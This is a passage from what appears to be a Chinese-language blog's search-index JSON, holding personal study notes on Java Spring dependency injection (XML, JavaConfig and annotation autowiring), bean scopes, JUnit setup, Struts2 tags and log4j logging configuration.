bean=\"{Bean_id}\" />\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"student1\" />\n    </set>\n</constructor-arg>\n\n```\n\n一般 Set 在 Java 是無序列排序\n但是在 Spring 使用 LinkedHashSet，所以是有排序的\n使用 C 名稱無法使用集合(collection)注入\n\n#### map\n\n```xml\n<constructor-arg name = \"name\">\n    <map>\n        <entry key=\"m1\" value=\"value1\" />\n        <entry key=\"m1\" value-ref=\"{bean_id}\" />\n    </map>\n</constructor-arg>\n\n```\n\n#### array\n\n```xml\n<!-- string -->\n<constructor-arg name = \"name\">\n    <list>\n        <value>Hello 1</value>\n        <value>Hello 2</value>\n        <value>Hello 3</value>\n    </list>\n</constructor-arg>\n\n<!-- bean -->\n<constructor-arg name = \"name\">\n    <list>\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"student1\" />\n    </list>\n</constructor-arg>\n```\n\n使用 java 方式\nString[] student;\nStudent[] student;\n\n##  屬性(setter) 注入\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.student\">\n    <property name=\"name\" value=\"John\" />\n</bean>\n<bean id=\"student2\" class=\"com.xxx.student\">\n    <property name=\"name\" value=\"Kane\" />\n</bean>\n```\n\n```java\nclass Student{\n    private String name;\n    public String setName(String name){\n        this.name = name;\n    }\n}\n```\n\n屬性名字如上 name，是跟著 set**Name**一致\n假如 method 名稱改成 setName1， xml 配住需要改`<property name=\"name1\" value=\"Kane\">`\n\n### 一般 property 標籤方法\n\n#### array\n\n```xml\n<bean id=\"classroom1\" class=\"com.xxx.classroom\">\n<property name=\"students\">\n    <array>\n        <ref bean=\"student1\">\n        <ref bean=\"student2\">\n    </array>\n</property>\n</bean>\n```\n\n#### list\n\n```xml\n<bean id=\"classroom1\" class=\"com.xxx.classroom\">\n<property name=\"students\">\n    <list>\n        <ref bean=\"student1\">\n        <ref bean=\"student2\">\n    </list>\n</property>\n</bean>\n```\n\n#### set\n\n```xml\n<bean id=\"classroom1\" class=\"com.xxx.classroom\">\n<property name=\"students\">\n    <set>\n        <ref bean=\"student1\">\n        <ref bean=\"student2\">\n    </set>\n</property>\n</bean>\n```\n\n#### object\n\n```xml\n<bean id=\"classroom1\" class=\"com.xxx.classroom\">\n    <property name=\"student\" ref=\"student1\" />\n</bean>\n```\n\n### p 命名空間\n\n在 beans 屬性加入`  xmlns:p=\"http://www.springframework.org/schema/p\"`\n如:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:p=\"http://www.springframework.org/schema/p\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n        http://www.springframework.org/schema/beans/spring-beans.xsd\">\n```\n\n#### 一般使用方法\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\">\n</bean>\n```\n\n#### object\n\n```xml\n<bean id=\"classroom1\" class=\"com.xxx.Classroom\" p:student-ref=\"student1\">\n</bean>\n```\n\n備註\np 命名空間一樣不能用集合(collection)方法\n\n#### util 名稱空間\n\n只能用在 p命名空間\n\n##### 宣告\n\n`xmlns:util=\"http://www.springframework.org/schema/util\"` \n和\n```xml\n     xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd\n     http://www.springframework.org/schema/util\n     http://www.springframework.org/schema/util/spring-util-4.1.xsd\">\n```\n\n結果\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \nxmlns:util=\"http://www.springframework.org/schema/util\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd\n     http://www.springframework.org/schema/util\n     http://www.springframework.org/schema/util/spring-util-4.1.xsd\">\n```\n\n##### 使用 array 或 list\n\n```xml\n<util:list id=\"studentList\">\n    <ref bean=\"student1\" />\n    <ref bean=\"student2\" />\n</util:list>\n\n<bean id=\"classroom1\" class=\"com.xxx.classroom\" p:students-ref=\"studentList\">\n<!-- <property name=\"students\">\n    <list>\n        <ref bean=\"student1\">\n        <ref bean=\"student2\">\n    </list>\n</property> -->\n</bean>\n```\n\n##### set、map \n\n```xml\n<util:map id=\"studentList\">\n    <ref bean=\"student1\" />\n    <ref bean=\"student2\" />\n</util:map>\n```\n\n以此類推\n\n## 複習Spring 那些裝配\n\n1. 自動裝配\n2. Java 裝配\n3. XML 裝配\n\n## 相關知識\n\n### 預設注入生命週期\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\">\n</bean>\n```\n\n```java\npublic class Student{\n\n    public test1(){\n        System.out.println(\" Student \" + this.toString());\n    }\n}\n```\n\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(\"classpath:applicationContext.xml\")\npublic class AppTest{\n\n    @Autowired\n    private Student student1;\n\n    @Autowired\n    private Student student2;\n\n    @test\n    public void test1(){\n\n    }\n}\n```\n\n```java\npublic class AppTest{\n    public static void main(String[] argv){\n        ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n\n\t\t// Student st1 = (Student)context.getBean(\"student\");\n        // Student st2 = (Student)context.getBean(\"student\");\n\n        // System.out.println(st1 == st2); //true\n    }\n}\n\n```\n\n\n執行程式會看到 Bean 會啟動，不管會不會呼叫\n預設啟動是**單例模式**\n\n### 生命週期\n\n1. 單例(Sinletion)\n\n在整個應用程序中，只創建 bean 的一個實例\n\n2. 原型(Prototype)\n\n每次注入或通過 Spring 上下文獲取的時候，都會創建一個新的 bean 實例\n簡單說就是每一次 @Autowired 都會實例出來\n\n3. 會話(Session)\n\n在 Web 應用中，為每個會話創建一個 bean 實例\n\n4. 請求(Request)\n\n在 Web 應用中，為每個請求創建一個 bean 實例\n\n\n#### 設定生命周期作用域\n\n**scope=**\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\" scope=\"prototype\">\n</bean>\n```\n\n## 總整理作用域配置\n\n### xml 配置\n\nscope=\"singleton\"\n\n### 自動裝配\n\n@Component\n@Scope(\"singletion\")\n\n### JavaConfig 配置\n\n@Bean\n@Scope(ConfigurableBeanFactory.SCOPE_SINGLETON)\n\n## 延遲加載\n\n通常用於單例模式\n\n### xml 配置\n\nlazy-init=\"true\"\n\n### 自動配裝\n\n@Component\n@Lazy\n\n### JavaConfig\n\n@Bean\n@Lazy\n\n## 初始化方法和銷毀方法\n\n### xml 配置\n\ninit-method=\"init\" destory-method=\"destory\"\n\n### 自動配裝和 JavaConfig\n\n```java\n@PostConstruct\npublic void init() { System.out.println(\"始化方法\"); }\n\n@PreDestroy\npublic void destroy() { System.out.println(\"銷毀方法\"); }\n```\n\n## 工廠方法\n\n### 靜態工廠方法\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.Student\" factory-method=\"createStudent1\"/>\n```\n\n### 實例方法\n\n```xml\n<bean id=\"studentFactory\" class=\"com.xxx.Student\" />\n<bean id=\"student2\" factory-bean=\"studentFactory\" factory-method=\"createStudent1\" />\n```\n\n## props 屬性\n\n\n\n\n其他參考:\n[【Spring学习12】XML简写p-namespace及c-namespace_java_程序老兵的博客-CSDN博客](https://blog.csdn.net/soonfly/article/details/68928683)\n[菜鳥工程師 肉豬: Spring 注入properties檔的參數設定](https://matthung0807.blogspot.com/2017/11/springproperties.html)\n[Joseph 筆記本: Java Spring Framework 筆記 - Bean configutation file 設定](https://josephdotw.blogspot.com/2018/09/java-spring-framework-1-bean.html)\n[spring中constructor-arg 构造方法注入 - 红色小宇宙 - 博客园](https://www.cnblogs.com/sanhuan/p/4789054.html)","tags":["spring"],"categories":["Java"]},{"title":"JavaConfig 設定 bean 物件","url":"%2Fblog%2F2020%2F05%2F13%2FJavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6%2F","content":"\n這邊不使用自動載入\n\n<!--more-->\n\n## 一般注入\n\n```java\n@Configuration\npublic class ...{\n    @Bean\n    public UserDao userDaoNormal{\n        return new UserDaoNormal();\n    }\n}\n```\n\n## 建構式注入\n\n### 一般方法\n\n```java\n@Configuration\npublic class ...{\n    @Bean\n    public UserService userServiceNormal(){\n        UserDao userDao = userDaoNormal();\n        return new UserService(userDao);\n    }\n}\n```\n\n### 更好的方法(不多一個 instance )\n\n```java\n@Configuration\npublic class ...{\n\n    @Bean\n    public UserDao userDaoNormal{\n        return new UserDaoNormal();\n    }\n\n    @Bean\n    public UserService userServiceNormal(userDao userDao){\n        return new UserService(userDao);\n    }\n}\n```\n\n## setter 注入方法\n\n```java\n@Configuration\npublic class ...{\n\n    @Bean\n    public UserDao userDaoNormal{\n        return new UserDaoNormal();\n    }\n\n    @Bean\n    public UserService setUserDao(userDao userDao){\n        return new UserService(userDao);\n    }\n}\n```\n\n### 任意方法也可以\n\n```java\n@Configuration\npublic class ...{\n\n    @Bean\n    public UserDao userDaoNormal{\n        return new UserDaoNormal();\n    }\n\n    @Bean\n    public UserService prepareUserDao(userDao userDao){\n        return new UserService(userDao);\n    }\n}\n```\n\n## 解決衝突方法\n\n自動注入和 JavaConfig 解決方案一致\n\n### @Primary\n\n### Qualifier(\"xxxXxxx\")\n\n@Qualifier(\"xxXxxx\")  宣告 or 參數\n\n@Qualifier(\"xxxXxxx\") 宣告\n\n### @Bean 命名方法\n\n默認 @Bean 方法名稱","tags":["java"],"categories":["Java"]},{"title":"Spring 自動注入小記","url":"%2Fblog%2F2020%2F05%2F11%2FSpring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98%2F","content":"\n自動注入筆記\n\n<!--more-->\n\n## autowired 加載方式\n\n\n### 建構子\n\n### 成員變數\n\n### setter method\n\n### 任意 method\n\n## XML 自動掛載\n\n```xml\n<content:component-scan base-package=\"com.xxxx.oooo\">\n```\n\n## 自動載入相關 annotation\n\n### 自動載入\n\n組間掃描\n@Component\n@ComponentScan\n\n自動注入\n@Autowired\n\n### 定義配置類\n\n@Configuration(classes=AppConfig.class)\n\n### JUnit\n\n#### 安裝\n\n1. 設定 JUnit Library 加載\npom.xml 設定 spring-test,junit 如下設定參考\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>com.qfedu</groupId>\n  <artifactId>spring01demo</artifactId>\n  <version>0.0.1-SNAPSHOT</version>\n  <dependencies>\n\t<!-- https://mvnrepository.com/artifact/org.springframework/spring-context -->\n\t<dependency>\n\t    <groupId>org.springframework</groupId>\n\t    <artifactId>spring-context</artifactId>\n\t    <version>4.3.13.RELEASE</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>log4j</groupId>\n\t\t<artifactId>log4j</artifactId>\n\t\t<version>1.2.17</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>junit</groupId>\n\t\t<artifactId>junit</artifactId>\n\t\t<version>4.12</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>org.springframework</groupId>\n\t\t<artifactId>spring-test</artifactId>\n\t\t<version>4.3.13.RELEASE</version>\n\t</dependency>\n  </dependencies>\n</project>\n```\n\n\n2. 設定 test 程式加入 設定\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = AppConfig.class)\n\n**這邊注意\n\n```java\npackage hello;\n\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = AppConfig.class)\npublic class testHello {\n\n\t@Autowired\n\tprivate MessagePrinter messagePrinter;\n\t\n\t@Test\n\tpublic void testPrint() {\n\t\tmessagePrinter.printMessage();\n\t}\n}\n\n```\n\n3. 自動載入\n@Autowired\n\n下面程式參考:[JUnit高级用法之@RunWith - 摆渡者 - OSCHINA](https://my.oschina.net/itblog/blog/1550753)\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = { \"classpath:applicationContext.xml\" })\npublic class UserManagerTest {\n　　@Autowired\n　　ApplicationContext ctx;\n\n　　@Test\n　　public void testAddUser() {\n　　　　try {\n　　　　　　UserManager userManager = ctx.getBean(UserManager.class); \n　　　　　　userManager.addUser();\n　　　　} catch (Exception e) {\n　　　　　　e.printStackTrace();\n　　　　}\n　　}\n}\n```\n\n## 自動配裝衝突\n\n1. @Primary\n在 Component 定義 @primary\n\n2. @Qualifier\n默認 `宣告` 和 `配裝` 使用 @Qualifier\n\n3. @Qualifier\n自動配裝可使用 bean id(第一個小寫)\n@Qualifier(\"helloWorld\")\n\n## 相關載入事情\n\n1. @Resource( name = \"helloWorld\" )\n\n`@Resource( name = \"helloWorld\" )` 等於\n```\n@Autowired\n@Qualifier( name = \"helloWorld\" )\n```\n\n2. @Controller , @Service, @Repository\n`@Controller , @Service, @Repository` 等於 @Component 相同功能\n比較有語意，跟 @Component 沒什麼差別。\n\n## Autowired (require = false )\n\nif(xxx == null)\n\n## 指定掃描\n\n1. @ComponentScan( \"com.xxx.demo\" )\n掃描底下 \"com.xxx.demo\"的所有 Package\n\n2. @ComponentScan( basePackages = {\"com.xxx.demo.web\", \"com.xxx.demo.service\", \"com.xxx.demo.dao\"})\n解決上面不能放多個\n\n2. @ComponentScan( basePackageClasses = {MessagePrinter.class, MessageService.class})\n上面嚴重缺點，不能自動用程式\"重構\"功能，連帶修改\n\n\n\n\n## 小記\n\n這邊的 @Autowired 預設都是**單例模式**\n額且啟動服務(這邊講的是 Web )的時候，這些套件就會自動載入\n\n這邊也順便紀錄一下，Servlet 生命週期，init() 是 request 觸發的時候會觸發\nServlet 其實也算是只會實例一個，不是多個 Servlet 程式\n所以在多執行緒需要注意一下問題...","tags":["junit"],"categories":["Java"]},{"title":"JSP 一些常看標籤小記(JSTL, EL, ONGL)","url":"%2Fblog%2F2020%2F05%2F10%2FJSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL%2F","content":"\n最近使用 struts2 `<s:property value=\"text\">` \n但在 JSP 頁面要做 if 判斷\n我今天抓不到 struts2 test值\n剛好網路爬文就找到這篇[EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客](https://blog.csdn.net/qq30211478/article/details/77188991)\n順便整理\n\n<!--more-->\n\n## 先解 struts2 我遇到的問題\n\n`<s:if test=\"\">` 要怎麼判斷 `<s:property value=\"msg\">` 呢?\n\n```\n    <s:if test='messageStore == \"Hello Struts User (from toString)\"'>\n    123456789\n    </s:if>\n```\n\n\n\n[阿信 (Silver8250) 的冷泡咖啡館~: [Struts2] Struts2 Data Tags](http://silver8250.blogspot.com/2009/05/struts2-struts2-data-tags.html)\n\n\n[EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客](https://blog.csdn.net/qq30211478/article/details/77188991)\n\n\n[C标签和s标签的对比，特别是里面的if判断条件的写法_java_寂寞是一个人的狂欢，狂欢是一群人的寂寞...-CSDN博客](https://blog.csdn.net/u010735684/article/details/51374484) \n[jsp中c:if与s:if的区别 - struggle_beiJing - 博客园](https://www.cnblogs.com/beijingstruggle/p/5855043.html)\n","tags":["el"],"categories":["Java"]},{"title":"Spring 建立應用程式起手式","url":"%2Fblog%2F2020%2F05%2F02%2FSpring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F%2F","content":"\n最近看了一些 Spring 教學\n這篇整理一下建制 Spring 需要步驟\n\n<!--more-->\n\n## Eclipse 使用 Maven 建置 Spring\n\n{% asset_img eclipse01.png title %}\n{% asset_img eclipse02.png title %}\n{% asset_img eclipse03.png title %}\n{% asset_img eclipse04.png title %}\n\n### 建置 Maven 預到 Eclipse 警告\n\n參考:[Maven錯誤 – #001 – JDK預設版本1.5 – Syuan的筆記](http://twsyuan.com/2018/06/maven%E9%8C%AF%E8%AA%A4-001/)\n\n不知道是我的 Eclipse 自帶 Maven \n我測試把 setting.xml 複製到 `C:\\Users\\Administrator\\.m2`\n我是用 Chocolatey 安裝 Maven\n可以到`C:\\ProgramData\\Chocolatey\\lib\\maven` 找到 setting.xml \n因為我安裝是 1.13 JDK 版本，所以這邊調整 1.13\n```xml\n  <profiles>\n  \t<profile>   \n\t\n    <id>jdk1.13</id>    \n    <activation>   \n        <activeByDefault>true</activeByDefault>    \n        <jdk>1.13</jdk>   \n    </activation>   \n\t\n    <properties>   \n        <maven.compiler.source>1.13</maven.compiler.source>    \n        <maven.compiler.target>1.13</maven.compiler.target>    \n        <maven.compiler.compilerVersion>1.13</maven.compiler.compilerVersion>   \n    </properties>   \n\t\n\t</profile>\n    <!-- profile\n```\n\n這樣建置新專案就不會有問題了\n\n\n## 一般呼叫 Object\n\n```java Application.java\npackage hello;\n\npublic class Application {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tSystem.out.println(\"application\");\n\t\t\n\t\tMessagePrinter printer = new MessagePrinter();\n\t\t\n\t\tMessageService service = new MessageService();\n\t\t\n\t\tprinter.setService(service);\n\t\t\n\t\tprinter.printMessage();\n\t}\n}\n\n```\n\n```java MessagePrinter.java\npackage hello;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\npublic class MessagePrinter {\n\t\n\t/**\n\t * 設定 MessageService 關係\n\t */\n\tprivate MessageService service;\n\t\n\tpublic MessagePrinter() {\n\t\tsuper();\n\t\tSystem.out.println(\"MessagePrinter...\");\n\t}\n\n\t/**\n\t * 設定 service 值\n\t * @param service\n\t */\n\t@Autowired\n\tpublic void setService(MessageService service) {\n\t\tthis.service = service;\n\t}\n\t\n\tpublic void printMessage() {\n\t\tSystem.out.print(this.service.getMessage());\n\t}\n}\n\n```\n\n```java MessageService.java\npackage hello;\n\nimport org.springframework.stereotype.Component;\n\npublic class MessageService {\n\n\tpublic MessageService() {\n\t\tsuper();\n\t\tSystem.out.println(\"MessageService...\");\n\t}\n\n\t/**\n\t * print Hello World\n\t * @return print Hello World\n\t */\n\tpublic String getMessage() {\n\t\treturn \"Hello World\";\n\t}\n}\n\n```\n\n## Spring Autowired 方式(annotation)\n\n這邊簡單說幾個 annotation 重點\n@Component\n@ComponentScan 標籤需要放在主程式，會掃有關 @Component\n@Autowired 放在 setXXXX(MessageService service)\n這邊跟我公司實戰上不時一樣\n但這應該是最原始寫法\n\n```java ApplicationSpring.java\npackage hello;\n\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\nimport org.springframework.context.annotation.ComponentScan;\n\n/**\n * 可以掃描 @Component\n *\n */\n@ComponentScan\npublic class ApplicationSpring {\n\n\tprivate static ApplicationContext context;\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tSystem.out.println(\"applicationSpring\");\n\t\t\n\t\tcontext = new AnnotationConfigApplicationContext(ApplicationSpring.class);\n\t\t\n\t\t// 從容器中獲取 MessagePrinter  物件\n\t\tMessagePrinter printer = context.getBean(MessagePrinter.class);\n\t\t\n//\t\tMessageService service = context.getBean(MessageService.class);\n\t\t\n\t\tSystem.out.println(printer);\n//\t\tSystem.out.println(service);\n\t\t\n//\t\tprinter.setService(service);\n\t\tprinter.printMessage();\n\t}\n}\n\n```\n\n```java MessagePrinter.java\npackage hello;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class MessagePrinter {\n\t\n\t/**\n\t * 設定 MessageService 關係\n\t */\n\tprivate MessageService service;\n\t\n\tpublic MessagePrinter() {\n\t\tsuper();\n\t\tSystem.out.println(\"MessagePrinter...\");\n\t}\n\n\t/**\n\t * 設定 service 值\n\t * @param service\n\t */\n\t@Autowired\n\tpublic void setService(MessageService service) {\n\t\tthis.service = service;\n\t}\n\t\n\tpublic void printMessage() {\n\t\tSystem.out.print(this.service.getMessage());\n\t}\n}\n\n```\n\n```java MessageService.java\npackage hello;\n\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class MessageService {\n\n\tpublic MessageService() {\n\t\tsuper();\n\t\tSystem.out.println(\"MessageService...\");\n\t}\n\n\t/**\n\t * print Hello World\n\t * @return print Hello World\n\t */\n\tpublic String getMessage() {\n\t\treturn \"Hello World\";\n\t}\n}\n\n```\n\n## Spring Autowired 方式(xml)\n\n傳統 XML 配置\n\n```java\npackage hello;\n\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.ClassPathXmlApplicationContext;\n\n\npublic class ApplicationSpring {\n\n\tpublic static void main(String[] args) {\n\n\t\tSystem.out.println(\"applicationSpring\");\n\n\t\tApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n\n\t\t// 從容器中獲取 MessagePrinter 物件\n\t\tMessagePrinter printer = context.getBean(MessagePrinter.class);\n\n\t\tSystem.out.println(printer);\n\n\t\tprinter.printMessage();\n\t}\n}\n\n```\n\n其他的 Java 就把所有 @xxx 拿掉\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n    http://www.springframework.org/schema/beans/spring-beans.xsd \n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context.xsd\">\n     \n    <!--\n        bean 元素: 描述當前的物件需要由 spring 容器管理\n        id 屬性: 標示物件，未來在應用程序中可以根據 id 獲取物件\n        class: 被管理物件的類全名\n    -->\n    <bean id=\"service\"    class=\"hello.MessageService\"></bean>\n    <!--\n        <property name=\"service\" ...\n        這邊的 name 是指 MessagePrinter.java\n        \tprivate MessageService service;\n\n        ref=\"service\"\n        這邊的 service 是指上面的\n        <bean id=\"service\"    class=\"hello.MessageService\"></bean>\n    -->\n    <bean id=\"printer\"    class=\"hello.MessagePrinter\">\n        <property name=\"service\" ref=\"service\">\n    </bean>\n     \n</beans> \n\n```\n\nApplication\n\n### Eclipse 建置 applicationContext.xml\n\n[eclipse 新建applicationContext.xml文件 - 开发者知识库](https://www.itdaan.com/tw/aca117e170d18e2da5fd791876dfece2)\n\n目前只找到複製方式貼上...\n\n```xml applicationContext.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n    http://www.springframework.org/schema/beans/spring-beans.xsd \n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context.xsd\">\n     \n     \n</beans> \n```\n\n這樣就能正常執行了\n\n### Resource leak: context is never closed\n\n- [警告：Spring ApplicationContext - Resource leak: context is never closed的处理_Java_梅森上校的博客 业精于勤荒于嬉，形成于思毁于随。-CSDN博客](https://blog.csdn.net/seagal890/article/details/53958868)\n- [spring - How does this code resolve \"Resource Leak:'context' is never closed\" warning? - Stack Overflow](https://stackoverflow.com/questions/26573767/how-does-this-code-resolve-resource-leakcontext-is-never-closed-warning)\n```\n((ConfigurableApplicationContext) context).close();\n```\n\n\n## Spring 查看 log4j IoC 過程\n\nSpring 使用 common-logging ，所以看一下關方文件說明\n> To make Log4j 1.2 work with the default JCL dependency (commons-logging) all you need to do is put Log4j on the classpath, and provide it with a configuration file (log4j.properties or log4j.xml in the root of the classpath)\n\n[2. Introduction to the Spring Framework](https://docs.spring.io/spring/docs/4.3.13.RELEASE/spring-framework-reference/html/overview.html#overview-logging-log4j)\n\ncommon-logging 跟 slf4j 差別\n[java日志组件介绍（common-logging，log4j，slf4j，logback ）_Java_yycdaizi的专栏-CSDN博客](https://blog.csdn.net/yycdaizi/article/details/8276265)\n\n> slf4j 與 common-logging 比較\ncommon-logging通過動態查找的機制，在程序運行時自動找出真正使用的日誌庫。由於它使用了ClassLoader尋找和載入底層的日誌庫， 導致了象OSGI這樣的框架無法正常工作，因為OSGI的不同的插件使用自己的ClassLoader。 OSGI的這種機制保證了插件互相獨立，然而卻使Apache Common-Logging無法工作。\n> slf4j在編譯時靜態綁定真正的Log庫,因此可以再OSGI中使用。另外，SLF4J 支持參數化的log字符串，避免了之前為了減少字符串拼接的性能損耗而不得不寫的if(logger.isDebugEnable())，現在你可以直接寫：logger.debug(「current user is: {}」, user)。拼裝消息被推遲到了它能夠確定是不是要顯示這條消息的時候，但是獲取參數的代價並沒有倖免。\n\n```xml \n\t<dependency>\n\t\t<groupId>log4j</groupId>\n\t\t<artifactId>log4j</artifactId>\n\t\t<version>1.2.17</version>\n\t</dependency>\n```\n\n```properties log4j.properties\n# info 級別日誌，名子叫 stdout\nlog4j.rootCategory=INFO, stdout\n\n# 輸出到控制台上輸出\nlog4j.appender.stdout=org.apache.log4j.ConsoleAppender\n# 按照一定格式輸出\nlog4j.appender.stdout.layout=org.apache.log4j.PatternLayout\nlog4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %t %c{2}:%L - %m%n\n# spring factory debug 級別輸出\nlog4j.category.org.springframework.beans.factory=DEBUG\n```\n\n不同 log (SLF4J) 設定可以看[2. Introduction to the Spring Framework](https://docs.spring.io/spring/docs/4.3.13.RELEASE/spring-framework-reference/html/overview.html#overview-logging-log4j)\n\n這實候執行程式\n\n可以看到以下 log\n```\napplicationSpring\n16:44:28,186  INFO main support.ClassPathXmlApplicationContext:583 - Refreshing org.springframework.context.support.ClassPathXmlApplicationContext@2a18f23c: startup date [Sat May 02 16:44:28 CST 2020]; root of context hierarchy\n16:44:28,220  INFO main xml.XmlBeanDefinitionReader:317 - Loading XML bean definitions from class path resource [applicationContext.xml]\n16:44:28,242 DEBUG main xml.DefaultDocumentLoader:73 - Using JAXP provider [com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl]\n16:44:28,266 DEBUG main xml.PluggableSchemaResolver:141 - Loading schema mappings from [META-INF/spring.schemas]\n16:44:28,270 DEBUG main xml.PluggableSchemaResolver:147 - Loaded schema mappings: {http://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd, http://www.springframework.org/schema/cache/spring-cache-4.3.xsd=org/springframework/cache/config/spring-cache-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-4.0.xsd=org/springframework/beans/factory/xml/spring-beans-4.0.xsd, http://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd, http://www.springframework.org/schema/context/spring-context-4.0.xsd=org/springframework/context/config/spring-context-4.0.xsd, http://www.springframework.org/schema/util/spring-util-4.3.xsd=org/springframework/beans/factory/xml/spring-util-4.3.xsd, http://www.springframework.org/schema/jee/spring-jee-2.0.xsd=org/springframework/ejb/config/spring-jee-2.0.xsd, http://www.springframework.org/schema/aop/spring-aop-2.0.xsd=org/springframework/aop/config/spring-aop-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool-4.3.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/util/spring-util-2.0.xsd=org/springframework/beans/factory/xml/spring-util-2.0.xsd, http://www.springframework.org/schema/cache/spring-cache-4.2.xsd=org/springframework/cache/config/spring-cache-4.2.xsd, http://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd, http://www.springframework.org/schema/tool/spring-tool-2.0.xsd=org/springframework/beans/factory/xml/spring-tool-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-3.2.xsd=org/springframework/beans/factory/xml/spring-beans-3.2.xsd, http://www.springframework.org/schema/util/spring-util-4.2.xsd=org/springframework/beans/factory/xml/spring-util-4.2.xsd, http://www.springframework.org/schema/beans/spring-beans-2.5.xsd=org/springframework/beans/factory/xml/spring-beans-2.5.xsd, http://www.springframework.org/schema/beans/spring-beans.xsd=org/springframework/beans/factory/xml/spring-beans-4.3.xsd, http://www.springframework.org/schema/tool/spring-tool-4.0.xsd=org/springframework/beans/factory/xml/spring-tool-4.0.xsd, http://www.springframework.org/schema/util/spring-util-4.1.xsd=org/springframework/beans/factory/xml/spring-util-4.1.xsd, http://www.springframework.org/schema/beans/spring-beans-4.2.xsd=org/springframework/beans/factory/xml/spring-beans-4.2.xsd, http://www.springframework.org/schema/context/spring-context-4.2.xsd=org/springframework/context/config/spring-context-4.2.xsd, http://www.springframework.org/schema/cache/spring-cache-4.1.xsd=org/springframework/cache/config/spring-cache-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang-3.0.xsd=org/springframework/scripting/config/spring-lang-3.0.xsd, http://www.springframework.org/schema/jee/spring-jee-4.3.xsd=org/springframework/ejb/config/spring-jee-4.3.xsd, http://www.springframework.org/schema/aop/spring-aop-4.3.xsd=org/springframework/aop/config/spring-aop-4.3.xsd, 